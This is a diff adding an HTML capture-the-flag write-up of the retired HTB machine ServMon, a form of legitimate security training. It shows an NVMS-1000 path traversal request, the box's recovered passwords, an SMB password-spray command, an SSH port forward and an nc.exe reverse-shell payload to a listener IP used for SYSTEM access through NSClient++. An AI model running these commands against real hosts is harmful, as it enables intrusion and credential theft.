@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ServMon &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>ServMon</h1>
+    <div class="meta">Target: <code>10.10.14.92</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">FTP</span><span class="tag">Anonymous</span><span class="tag">PathTraversal</span><span class="tag">NVMS1000</span><span class="tag">PasswordSpray</span><span class="tag">SSH</span><span class="tag">NSClient</span><span class="tag">PortForwarding</span><span class="tag">Unstable</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#ftp-anonymous-access">FTP, Anonymous Access</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#nvms-1000-path-traversal-cve-edb-48311">NVMS-1000 Path Traversal (CVE / EDB-48311)</a><a class="lvl3" href="#password-spray">Password Spray</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#nsclient-localhost-only-web-ui-command-execution">NSClient++, Localhost-Only Web UI + Command Execution</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>ServMon is an easy Windows box where anonymous FTP access leads to a note pointing at a sensitive file location, a path traversal in NVMS-1000 retrieves that password list, and password spraying over SSH yields a shell. Privilege escalation goes through NSClient++, which only accepts connections from localhost, requiring an SSH port forward before the web UI is usable for SYSTEM command execution. The NSClient privesc is notably unstable.</p>
+<blockquote>
+<p><strong>Note:</strong> the notes flag the NSClient++ privilege escalation as unstable, referencing 0xdf's writeup for timing details. This writeup documents the technique as recorded; results may require multiple attempts.</p>
+</blockquote>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           Microsoft ftpd
+22/tcp    open  ssh           OpenSSH for_Windows_8.0
+80/tcp    open  http
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+5666/tcp  open  tcpwrapped
+6063/tcp  open  tcpwrapped
+6699/tcp  open  tcpwrapped
+8443/tcp  open  ssl/https-alt
+</code></pre>
+<p>Port 80 redirects to an NVMS-1000 login page. Port 8443 serves NSClient++.</p>
+<h3 id="ftp-anonymous-access">FTP, Anonymous Access</h3>
+<p>FTP allows anonymous login and contains user directories for Nathan and Nadine. Two text files are recoverable:</p>
+<pre><code class="language-sh">cat &quot;Notes to do.txt&quot;
+1) Change the password for NVMS - Complete
+2) Lock down the NSClient Access - Complete
+3) Upload the passwords
+4) Remove public access to NVMS
+5) Place the secret files in SharePoint
+</code></pre>
+<pre><code class="language-sh">cat Confidential.txt
+Nathan,
+I left your Passwords.txt file on your Desktop. Please remove this once you have
+edited it yourself and place it back into the secure folder.
+Regards
+Nadine
+</code></pre>
+<p>The note tells us exactly where to look: <code>C:\Users\Nathan\Desktop\Passwords.txt</code>.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="nvms-1000-path-traversal-cve-edb-48311">NVMS-1000 Path Traversal (CVE / EDB-48311)</h3>
+<p>NVMS-1000 has a directory traversal vulnerability. Firefox blocks the traversal, but routing the request through Burp works:</p>
+<pre><code class="language-http">GET /../../../../../../../../../../../../users/nathan/desktop/passwords.txt HTTP/1.1
+Host: 10.129.227.77
+Cookie: dataPort=6063
+</code></pre>
+<p>The response returns the passwords file:</p>
+<pre><code>1nsp3ctTh3Way2Mars!
+Th3r34r3To0M4nyTrait0r5!
+B3WithM30r4ga1n5tMe
+‹redacted›
+0nly7h3y0unGWi11F0l10w
+IfH3s4b0Utg0t0H1sH0me
+Gr4etN3w5w17hMySk1Pa5$
+</code></pre>
+<blockquote>
+<p><strong>Why path traversal hits arbitrary files:</strong> NVMS-1000 constructs a filesystem path from the URL without sanitising <code>../</code> sequences, so the traversal walks up to drive root and then back down to any readable file. The <code>Cookie: dataPort=6063</code> header is required for the request to be processed.</p>
+</blockquote>
+<h3 id="password-spray">Password Spray</h3>
+<p>Build a user list from the FTP directory names and spray the recovered passwords over SMB:</p>
+<pre><code class="language-sh">nxc smb 10.129.227.77 -u users.txt -p pass.txt --continue-on-success
+</code></pre>
+<p>One hit:</p>
+<pre><code>ServMon\nadine:‹redacted›
+</code></pre>
+<p>SSH directly:</p>
+<pre><code>Microsoft Windows [Version 10.0.17763.864]
+nadine@SERVMON C:\Users\Nadine&gt;whoami
+servmon\nadine
+</code></pre>
+<p>User flag obtained from <code>C:\Users\Nadine\Desktop\user.txt</code>.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="nsclient-localhost-only-web-ui-command-execution">NSClient++, Localhost-Only Web UI + Command Execution</h3>
+<p>NSClient++ has a CLI helper to reveal the stored web password:</p>
+<pre><code>PS C:\Program Files\NSClient++&gt; .\nscp.exe web -- password --display
+Current password: ‹redacted›
+</code></pre>
+<p>The password is also in the <code>.ini</code> config file. However, the ini restricts access to localhost:</p>
+<pre><code>; Undocumented key
+allowed hosts = 127.0.0.1
+</code></pre>
+<p>Forward the port over the existing SSH session to access NSClient++ as localhost:</p>
+<pre><code class="language-sh">ssh nadine@10.129.227.77 -L 8443:127.0.0.1:8443
+</code></pre>
+<p>Browse to <code>https://127.0.0.1:8443</code> and log in with the recovered password.</p>
+<blockquote>
+<p><strong>Why the port forward matters:</strong> the <code>allowed hosts</code> directive causes NSClient++ to reject any HTTP request that doesn't originate from 127.0.0.1. By forwarding over SSH, our browser's connections arrive at the server's loopback interface, satisfying that check.</p>
+</blockquote>
+<p>Create a batch payload on disk:</p>
+<pre><code class="language-sh">\programdata\nc.exe 10.10.14.92 443 -e cmd
+</code></pre>
+<p>Add the script via Settings &gt; External Scripts &gt; Scripts &gt; +Add New, setting the value to <code>C:\\programdata\\shell.bat</code>. Then schedule it via Scheduler &gt; Schedules &gt; +Add New (value: <code>10s</code>, re-open and set to <code>df</code> to trigger).</p>
+<p>A SYSTEM shell is received on the listener. The timing is unreliable, multiple attempts may be needed.</p>
+<h2 id="root">Root</h2>
+<p>Box rooted as <code>nt authority\system</code>.</p>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Anonymous FTP is often the entry point on Windows boxes.</strong> Notes left between users frequently describe exactly where sensitive files live.</li>
+<li><strong>Path traversal + a known file location = credential recovery.</strong> The FTP note told us the target path; the traversal retrieved it.</li>
+<li><strong>Password spraying after a credential dump is fast and low-noise.</strong> Seven passwords across three users requires only one spray run.</li>
+<li><strong>localhost-only services are bypassed with SSH port forwarding.</strong> If you have shell access, any service restricted to 127.0.0.1 becomes accessible.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
